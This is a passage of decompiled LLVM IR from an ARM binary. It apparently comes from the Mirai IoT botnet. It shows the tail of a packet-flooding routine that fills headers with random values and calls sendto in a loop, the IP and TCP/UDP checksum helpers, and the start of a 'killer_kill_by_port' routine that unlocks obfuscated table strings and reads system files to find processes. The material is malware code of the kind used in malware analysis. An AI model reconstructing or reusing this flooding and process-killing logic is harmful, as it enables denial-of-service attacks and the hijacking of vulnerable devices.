  store i32 %v3_c728, i32* %lr.global-to-local, align 4
  %v3_c72c = load i32, i32* @r6, align 4
  %v4_c72c = add i32 %v3_c72c, 16
  %v5_c72c = inttoptr i32 %v4_c72c to i16*
  store i16 %v5_c720, i16* %v5_c72c, align 2
  %v0_c730 = load i32, i32* %lr.global-to-local, align 4
  %v1_c730 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c730, -8
  %v5_c730 = add i32 %v0_c730, %tmp68
  store i32 %v5_c730, i32* %lr.global-to-local, align 4
  %v0_c734 = load i32, i32* @r6, align 4
  %v1_c734 = add i32 %v0_c734, 2
  %v2_c734 = inttoptr i32 %v1_c734 to i16*
  %v3_c734 = load i16, i16* %v2_c734, align 2
  %v4_c734 = zext i16 %v3_c734 to i32
  store i32 %v4_c734, i32* @r6, align 4
  %v1_c738 = load i32, i32* @r8, align 4
  %v2_c738 = add i32 %v1_c738, %v5_c730
  store i32 %v2_c738, i32* @lr, align 4
  %v3_c73c = add i32 %v2_c738, 2
  %v4_c73c = inttoptr i32 %v3_c73c to i16*
  store i16 %v3_c734, i16* %v4_c73c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c748 = load i32, i32* @r5, align 4
  store i32 %v0_c748, i32* %r1.global-to-local, align 4
  %v0_c74c = load i32, i32* @sl, align 4
  store i32 %v0_c74c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @lr, align 4
  %v6_c75c = call i32 @__libc_sendto(i32 %v0_c74c, i32 %v0_c748, i32 60, i32 16384, i32 %v0_c754, i32 16)
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  %v1_c764 = add i32 %v3_c760, 1
  store i32 %v1_c764, i32* %r0.global-to-local, align 4
  %v1_c768 = load i32, i32* @r7, align 4
  %v9_c768 = icmp eq i32 %v1_c764, %v1_c768
  store i1 %v9_c768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c764, i32* %stack_var_-44, align 4
  %v5_c770 = icmp slt i32 %v1_c764, %v1_c768
  br i1 %v5_c770, label %dec_label_pc_c678, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c6f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c778 = icmp eq i32 %v1_c768, 0
  store i1 %v2_c778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c778, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c788:                                ; preds = %dec_label_pc_c678
  %v1_c788 = add i32 %v2_c680, 16
  %v2_c788 = inttoptr i32 %v1_c788 to i32*
  %v3_c788 = load i32, i32* %v2_c788, align 4
  store i32 %v3_c788, i32* %r4.global-to-local, align 4
  %v0_c78c = call i32 @rand_next()
  store i32 %v0_c78c, i32* %r0.global-to-local, align 4
  %v3_c790 = load i32, i32* %stack_var_-44, align 4
  %v5_c798 = mul i32 %v3_c790, 24
  %v0_c79c = load i32, i32* %r4.global-to-local, align 4
  %v1_c79c = and i32 %v0_c79c, 16711680
  %v3_c7a0 = udiv i32 %v0_c79c, 16777216
  %v4_c7a4 = udiv i32 %v1_c79c, 256
  %v5_c7a4 = or i32 %v4_c7a4, %v3_c7a0
  store i32 %v5_c7a4, i32* %r2.global-to-local, align 4
  %v1_c7a8 = load i32, i32* @r8, align 4
  %v2_c7a8 = add i32 %v1_c7a8, %v5_c798
  store i32 %v2_c7a8, i32* %r1.global-to-local, align 4
  %v1_c7ac = and i32 %v0_c79c, 65280
  store i32 %v1_c7ac, i32* %r3.global-to-local, align 4
  %v1_c7b0 = add i32 %v2_c7a8, 20
  %v2_c7b0 = inttoptr i32 %v1_c7b0 to i8*
  %v3_c7b0 = load i8, i8* %v2_c7b0, align 1
  %v4_c7b0 = zext i8 %v3_c7b0 to i32
  %v5_c7b8 = call i32 @llvm.bswap.i32(i32 %v0_c79c)
  %v7_c7bc = lshr i32 %v0_c78c, %v4_c7b0
  %v8_c7bc = add i32 %v7_c7bc, %v5_c7b8
  store i32 %v8_c7bc, i32* %r2.global-to-local, align 4
  %v1_c7c0 = and i32 %v8_c7bc, 16711680
  store i32 %v1_c7c0, i32* %r0.global-to-local, align 4
  %v1_c7cc = and i32 %v8_c7bc, 65280
  store i32 %v1_c7cc, i32* %r1.global-to-local, align 4
  %v5_c7d4 = call i32 @llvm.bswap.i32(i32 %v8_c7bc)
  %v1_c7d8 = load i32, i32* @r5, align 4
  %v2_c7d8 = add i32 %v1_c7d8, 16
  %v3_c7d8 = inttoptr i32 %v2_c7d8 to i32*
  store i32 %v5_c7d4, i32* %v3_c7d8, align 4
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  %v0_c7e8 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c7f0 = load i32, i32* @r5, align 4
  %v2_c7f0 = add i32 %v1_c7f0, 12
  %v3_c7f0 = inttoptr i32 %v2_c7f0 to i32*
  store i32 %v0_c7e8, i32* %v3_c7f0, align 4
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v0_c7f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c7f8 = add i32 %v0_c7f8, -1
  store i32 %v1_c7f8, i32* @r4, align 4
  %v9_c7fc = icmp eq i32 %v3_c3f4, %v1_c7f8
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7fc, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c804:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v0_c804 = call i32 @rand_next()
  %v1_c804 = trunc i32 %v0_c804 to i16
  store i32 %v0_c804, i32* %r0.global-to-local, align 4
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v1_c80c = load i32, i32* @r4, align 4
  %v9_c80c = icmp eq i32 %v3_c3f8, %v1_c80c
  store i1 %v9_c80c, i1* %cpsr_z.global-to-local, align 1
  %v3_c810 = load i32, i32* @r5, align 4
  %v4_c810 = add i32 %v3_c810, 4
  %v5_c810 = inttoptr i32 %v4_c810 to i16*
  store i16 %v1_c804, i16* %v5_c810, align 2
  br i1 %v9_c80c, label %dec_label_pc_c818, label %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge

dec_label_pc_c804.dec_label_pc_c6c4_crit_edge:    ; preds = %dec_label_pc_c804
  %v1_c6c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6c4

dec_label_pc_c818:                                ; preds = %dec_label_pc_c804, %dec_label_pc_c6b8
  %v0_c818 = call i32 @rand_next()
  %v1_c818 = trunc i32 %v0_c818 to i16
  store i32 %v0_c818, i32* %r0.global-to-local, align 4
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v1_c820 = load i32, i32* @r4, align 4
  %v9_c820 = icmp eq i32 %v3_c3fc, %v1_c820
  store i1 %v9_c820, i1* %cpsr_z.global-to-local, align 1
  %v3_c824 = load i32, i32* @r5, align 4
  %v4_c824 = add i32 %v3_c824, 20
  %v5_c824 = inttoptr i32 %v4_c824 to i16*
  store i16 %v1_c818, i16* %v5_c824, align 2
  br i1 %v9_c820, label %dec_label_pc_c82c, label %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge

dec_label_pc_c818.dec_label_pc_c6d0_crit_edge:    ; preds = %dec_label_pc_c818
  %v1_c6d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6d0

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c818, %dec_label_pc_c6c4
  %v0_c82c = call i32 @rand_next()
  %v1_c82c = trunc i32 %v0_c82c to i16
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v1_c834 = load i32, i32* @r4, align 4
  %v9_c834 = icmp eq i32 %v5_c2c8, %v1_c834
  store i1 %v9_c834, i1* %cpsr_z.global-to-local, align 1
  %v3_c838 = load i32, i32* @r6, align 4
  %v4_c838 = add i32 %v3_c838, 2
  %v5_c838 = inttoptr i32 %v4_c838 to i16*
  store i16 %v1_c82c, i16* %v5_c838, align 2
  br i1 %v9_c834, label %dec_label_pc_c840, label %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge

dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge:    ; preds = %dec_label_pc_c82c
  %v1_c6e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c840:                                ; preds = %dec_label_pc_c82c, %dec_label_pc_c6d0
  %v0_c840 = call i32 @rand_next()
  %v1_c844 = load i32, i32* @r6, align 4
  %v2_c844 = add i32 %v1_c844, 4
  %v3_c844 = inttoptr i32 %v2_c844 to i32*
  store i32 %v0_c840, i32* %v3_c844, align 4
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v1_c84c = load i32, i32* @r4, align 4
  %v9_c84c = icmp eq i32 %v6_c2e0, %v1_c84c
  store i1 %v9_c84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c84c, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c854:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c854 = call i32 @rand_next()
  store i32 %v0_c854, i32* %r0.global-to-local, align 4
  %v0_c858 = load i32, i32* @fp, align 4
  %v2_c858 = icmp eq i32 %v0_c858, 0
  store i1 %v2_c858, i1* %cpsr_z.global-to-local, align 1
  %v1_c85c = load i32, i32* @r6, align 4
  %v2_c85c = add i32 %v1_c85c, 8
  %v3_c85c = inttoptr i32 %v2_c85c to i32*
  store i32 %v0_c854, i32* %v3_c85c, align 4
  br i1 %v2_c858, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c864:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854
  %v0_c864 = call i32 @rand_next()
  %v1_c864 = trunc i32 %v0_c864 to i16
  store i32 %v0_c864, i32* %r0.global-to-local, align 4
  %v3_c868 = load i32, i32* @r6, align 4
  %v4_c868 = add i32 %v3_c868, 18
  %v5_c868 = inttoptr i32 %v4_c868 to i16*
  store i16 %v1_c864, i16* %v5_c868, align 2
  br label %dec_label_pc_c6f0

dec_label_pc_c870:                                ; preds = %dec_label_pc_c3b0
  %v0_c870 = load i32, i32* @sl, align 4
  store i32 %v0_c870, i32* %r0.global-to-local, align 4
  %v1_c874 = call i32 @__GI___libc_close(i32 %v0_c870)
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %entry, %dec_label_pc_c870
  %v1_c880 = phi i32 [ %v3_c3a0, %entry ], [ %v1_c874, %dec_label_pc_c870 ]
  store i32 %v3_c1dc, i32* %r4.global-to-local, align 4
  store i32 %v24_c1dc, i32* %fp.global-to-local, align 4
  store i32 %v27_c1dc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c880

; uselistorder directives
  uselistorder i32 %v0_c864, { 1, 0 }
  uselistorder i32 %v0_c82c, { 1, 0 }
  uselistorder i32 %v0_c818, { 1, 0 }
  uselistorder i32 %v0_c804, { 1, 0 }
  uselistorder i32 %v1_c7f8, { 1, 2, 0 }
  uselistorder i32 %v0_c79c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c764, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c730, { 1, 0 }
  uselistorder i32 %v4_c720, { 1, 0 }
  uselistorder i1 %v3_c6b0, { 1, 0 }
  uselistorder i32 %v2_c654, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c4bc, { 1, 2, 0 }
  uselistorder i32 %v1_c488, { 2, 1, 0 }
  uselistorder i32 %v1_c484, { 2, 0, 1 }
  uselistorder i32 %v1_c480, { 2, 0, 1 }
  uselistorder i32 %v1_c47c, { 2, 0, 1 }
  uselistorder i32 %v1_c458, { 1, 0 }
  uselistorder i32 %v3_c3f4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c3e8, { 1, 0, 2 }
  uselistorder i32 %v0_c3e4, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i1 %v7_c3a4, { 1, 0 }
  uselistorder i32 %v3_c3a0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c38c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c2e0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c2c8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c24c, { 1, 0 }
  uselistorder i32 %v7_c234, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 41, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32*, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 103, 104, 105, 106, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 102, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c878, { 1, 0 }
  uselistorder label %dec_label_pc_c864, { 1, 0 }
  uselistorder label %dec_label_pc_c6f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c674, { 1, 0 }
  uselistorder label %dec_label_pc_c664, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8ac, label %dec_label_pc_c894

dec_label_pc_c894:                                ; preds = %entry
  %v0_c89c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %dec_label_pc_c898, %dec_label_pc_c894
  %v0_c8a4 = phi i32 [ %v2_c8a4, %dec_label_pc_c898 ], [ 0, %dec_label_pc_c894 ]
  %v0_c89c = phi i32 [ %v5_c89c, %dec_label_pc_c898 ], [ %v0_c89c.pre, %dec_label_pc_c894 ]
  %v0_c898 = phi i32 [ %v1_c898, %dec_label_pc_c898 ], [ %arg1, %dec_label_pc_c894 ]
  %v1_c898 = add i32 %v0_c898, -2
  %v1_c89c = inttoptr i32 %v0_c89c to i16*
  %v2_c89c = load i16, i16* %v1_c89c, align 2
  %v3_c89c = zext i16 %v2_c89c to i32
  %v5_c89c = add i32 %v0_c89c, -2
  store i32 %v5_c89c, i32* @r0, align 4
  %v2_c8a4 = add i32 %v3_c89c, %v0_c8a4
  %v1_c898.cmp = icmp ugt i32 %v1_c898, 1
  br i1 %v1_c898.cmp, label %dec_label_pc_c898, label %dec_label_pc_c8ac.loopexit

dec_label_pc_c8ac.loopexit:                       ; preds = %dec_label_pc_c898
  br label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %entry, %dec_label_pc_c8ac.loopexit
  %v1_c8b4 = phi i32 [ %v2_c8a4, %dec_label_pc_c8ac.loopexit ], [ 0, %entry ]
  %v0_c8ac = phi i32 [ %v1_c898, %dec_label_pc_c8ac.loopexit ], [ %arg1, %entry ]
  %v7_c8ac = icmp eq i32 %v0_c8ac, 1
  br i1 %v7_c8ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8ac
  %v1_c8b0 = load i32, i32* @r0, align 4
  %v2_c8b0 = inttoptr i32 %v1_c8b0 to i8*
  %v3_c8b0 = load i8, i8* %v2_c8b0, align 1
  %v4_c8b0 = zext i8 %v3_c8b0 to i32
  %v3_c8b4 = add i32 %v1_c8b4, %v4_c8b0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8ac, %bb
  %v0_c8b8 = phi i32 [ %v1_c8b4, %dec_label_pc_c8ac ], [ %v3_c8b4, %bb ]
  %v3_c8bc = urem i32 %v0_c8b8, 65536
  %v4_c8c0 = udiv i32 %v0_c8b8, 65536
  %v5_c8c0 = add nuw nsw i32 %v4_c8c0, %v3_c8bc
  %v4_c8c4 = udiv i32 %v5_c8c0, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v5_c8c0
  %v1_c8c8 = urem i32 %v5_c8c4, 65536
  %v3_c8d0 = xor i32 %v1_c8c8, 65535
  ret i32 %v3_c8d0

; uselistorder directives
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v5_c89c, { 1, 0 }
  uselistorder i32 %v1_c898, { 1, 0, 2 }
  uselistorder i32 %v0_c89c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8e8 = add i32 %arg1, 12
  %v2_c8e8 = inttoptr i32 %v1_c8e8 to i32*
  %v3_c8e8 = load i32, i32* %v2_c8e8, align 4
  %v1_c8ec = add i32 %arg1, 16
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v7_c8f0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f0, label %dec_label_pc_c8fc.preheader, label %dec_label_pc_c910

dec_label_pc_c8fc.preheader:                      ; preds = %entry
  %v0_c900.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8fc.preheader, %dec_label_pc_c8fc
  %v0_c908 = phi i32 [ 0, %dec_label_pc_c8fc.preheader ], [ %v2_c908, %dec_label_pc_c8fc ]
  %v0_c900 = phi i32 [ %v0_c900.pre, %dec_label_pc_c8fc.preheader ], [ %v5_c900, %dec_label_pc_c8fc ]
  %v0_c8fc = phi i32 [ %arg3, %dec_label_pc_c8fc.preheader ], [ %v1_c8fc, %dec_label_pc_c8fc ]
  %v1_c8fc = add nsw i32 %v0_c8fc, -2
  %v1_c900 = inttoptr i32 %v0_c900 to i16*
  %v2_c900 = load i16, i16* %v1_c900, align 2
  %v3_c900 = zext i16 %v2_c900 to i32
  %v5_c900 = add i32 %v0_c900, -2
  store i32 %v5_c900, i32* @r1, align 4
  %v2_c908 = add i32 %v3_c900, %v0_c908
  %v8_c90c = icmp sgt i32 %v1_c8fc, 1
  br i1 %v8_c90c, label %dec_label_pc_c8fc, label %dec_label_pc_c910.loopexit

dec_label_pc_c910.loopexit:                       ; preds = %dec_label_pc_c8fc
  br label %dec_label_pc_c910

dec_label_pc_c910:                                ; preds = %dec_label_pc_c910.loopexit, %entry
  %v1_c91c = phi i32 [ %v2_c908, %dec_label_pc_c910.loopexit ], [ 0, %entry ]
  %v0_c910 = phi i32 [ %v1_c8fc, %dec_label_pc_c910.loopexit ], [ %arg3, %entry ]
  %v7_c910 = icmp eq i32 %v0_c910, 1
  br i1 %v7_c910, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c910
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c910
  %v1_c914 = load i32, i32* @r1, align 4
  %v2_c914 = inttoptr i32 %v1_c914 to i8*
  %v3_c914 = load i8, i8* %v2_c914, align 1
  %v4_c914 = zext i8 %v3_c914 to i32
  %v3_c91c = add i32 %v4_c914, %v1_c91c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c944 = phi i32 [ %v1_c91c, %.thread ], [ %v3_c91c, %bb ]
  %v0_c924 = mul i32 %v3_c8e8, 65536
  %v3_c924 = udiv i32 %v0_c924, 65536
  %v3_c928 = urem i32 %v3_c8ec, 65536
  %v4_c930 = udiv i32 %v3_c8e8, 65536
  %v2_c92c = add nuw nsw i32 %v3_c928, %v4_c930
  %v5_c930 = add nuw nsw i32 %v2_c92c, %v3_c924
  %v1_c934 = add i32 %arg1, 9
  %v2_c934 = inttoptr i32 %v1_c934 to i8*
  %v3_c934 = load i8, i8* %v2_c934, align 1
  %v4_c934 = zext i8 %v3_c934 to i32
  %v4_c938 = udiv i32 %v3_c8ec, 65536
  %v3_c940 = mul nuw nsw i32 %v4_c934, 256
  %v5_c938 = add i32 %v4_c938, %arg2
  %v2_c93c = add i32 %v5_c938, %v1_c944
  %v2_c944 = add i32 %v2_c93c, %v5_c930
  %v2_c948 = add i32 %v2_c944, %v3_c940
  %tmp = icmp ult i32 %v2_c948, 65536
  br i1 %tmp, label %dec_label_pc_c968, label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %bb19, %dec_label_pc_c954
  %v2_c95c5 = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606.in = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606 = udiv i32 %v3_c9606.in, 65536
  %v3_c958 = urem i32 %v2_c95c5, 65536
  %v2_c95c = add nuw nsw i32 %v3_c958, %v3_c9606
  %tmp20 = icmp ult i32 %v2_c95c, 65536
  br i1 %tmp20, label %dec_label_pc_c968.loopexit, label %dec_label_pc_c954

dec_label_pc_c968.loopexit:                       ; preds = %dec_label_pc_c954
  br label %dec_label_pc_c968

dec_label_pc_c968:                                ; preds = %dec_label_pc_c968.loopexit, %bb19
  %v0_c968 = phi i32 [ %v2_c95c, %dec_label_pc_c968.loopexit ], [ %v2_c948, %bb19 ]
  %v1_c968 = urem i32 %v0_c968, 65536
  %v3_c970 = xor i32 %v1_c968, 65535
  ret i32 %v3_c970

; uselistorder directives
  uselistorder i32 %v2_c95c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c948, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c91c, { 1, 0 }
  uselistorder i32 %v5_c900, { 1, 0 }
  uselistorder i32 %v0_c900, { 1, 0 }
  uselistorder i32 %v3_c8e8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8fc, { 1, 0 }
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c97c = load i32, i32* @r4, align 4
  %v6_c97c = load i32, i32* @r5, align 4
  %v9_c97c = load i32, i32* @r6, align 4
  %v12_c97c = load i32, i32* @r7, align 4
  %v15_c97c = load i32, i32* @r8, align 4
  %v18_c97c = load i32, i32* @sb, align 4
  %v21_c97c = load i32, i32* @sl, align 4
  %v24_c97c = load i32, i32* @fp, align 4
  %v27_c97c = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c998 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c998, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9c4 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9c4, i32* @fp, align 4
  %v4_c9d0 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_c9d4 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c9d4, i32* @sl, align 4
  %v0_c9d8 = load i32, i32* @r5, align 4
  %v3_c9e4 = bitcast i32* %stack_var_-8777 to i8*
  %v4_c9e4 = call i32 @__GI_memset(i8* %v3_c9e4, i32 %v0_c9d8, i32 4096)
  %v0_c9ec = load i32, i32* @r5, align 4
  %v3_c9f8 = bitcast i32* %stack_var_-4681 to i8*
  %v4_c9f8 = call i32 @__GI_memset(i8* %v3_c9f8, i32 %v0_c9ec, i32 4096)
  %v2_c9fc = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9fc, i32* @sb, align 4
  %v0_ca00 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca00 = udiv i32 %v0_ca00, 256
  %v1_ca04 = urem i32 %v0_ca00, 256
  store i32 %v1_ca04, i32* @r4, align 4
  %v3_ca14 = trunc i32 %v3_ca00 to i8
  %v4_ca14 = call i32 @util_itoa(i8 %v3_ca14, i32 16, i32 %v2_c9fc)
  %v2_ca1c = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca20 = icmp eq i32 %v2_ca1c, 2
  br i1 %v7_ca20, label %dec_label_pc_cee4, label %dec_label_pc_ca28

dec_label_pc_ca28:                                ; preds = %entry, %dec_label_pc_cee4
  %v1_ca2c = call i32 @table_unlock_val(i32 13)
  %v1_ca34 = call i32 @table_unlock_val(i32 14)
  %v1_ca3c = call i32 @table_unlock_val(i32 15)
  %v1_ca44 = call i32 @table_unlock_val(i32 17)
  %v0_ca48 = load i32, i32* @r5, align 4
  %v2_ca50 = inttoptr i32 %v0_ca48 to i32*
  %v3_ca50 = call i32 @table_retrieve_val(i32 17, i32* %v2_ca50)
  %v0_ca54 = load i32, i32* @r5, align 4
  %v2_ca58 = call i32 @__libc_open(i32 %v3_ca50, i32 %v0_ca54)
  %v7_ca5c = icmp eq i32 %v2_ca58, -1
  store i32 %v2_ca58, i32* @r8, align 4
  br i1 %v7_ca5c, label %bb, label %dec_label_pc_ca6c.preheader

bb:                                               ; preds = %dec_label_pc_ca28
  %v1_ca64 = load i32, i32* @r5, align 4
  store i32 %v1_ca64, i32* @r4, align 4
  br label %dec_label_pc_ce80

dec_label_pc_ca6c.preheader:                      ; preds = %dec_label_pc_ca28
  %v4_ca7856 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca58)
  %v2_ca7c58 = icmp eq i32 %v4_ca7856, 0
  br i1 %v2_ca7c58, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84.lr.ph

dec_label_pc_ca84.lr.ph:                          ; preds = %dec_label_pc_ca6c.preheader
  %v2_cacc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca84.lr.ph, %dec_label_pc_ca6c.backedge
  %v3_ca88 = load i8, i8* %stack_var_-585, align 1
  %v4_ca88 = sext i8 %v3_ca88 to i32
  store i32 %v4_ca88, i32* @r3, align 4
  %v2_ca8c = icmp eq i8 %v3_ca88, 0
  br i1 %v2_ca8c, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca84
  %v8_ca90 = icmp eq i8 %v3_ca88, 58
  br i1 %v8_ca90, label %.thread8, label %dec_label_pc_caa4

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cabc

bb126:                                            ; preds = %dec_label_pc_ca84
  br label %dec_label_pc_cabc

dec_label_pc_caa4:                                ; preds = %bb125
  %v1_caac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %bb127, %dec_label_pc_caa4
  %v0_caa8 = phi i32 [ %v1_caa8, %bb127 ], [ 0, %dec_label_pc_caa4 ]
  %v1_caa8 = add i32 %v0_caa8, 1
  %v2_caac = add i32 %v1_caa8, %v1_caac.pre
  %v3_caac = inttoptr i32 %v2_caac to i8*
  %v4_caac = load i8, i8* %v3_caac, align 1
  %v6_caac = zext i8 %v4_caac to i32
  store i32 %v6_caac, i32* @r3, align 4
  %v2_cab0 = icmp eq i8 %v4_caac, 0
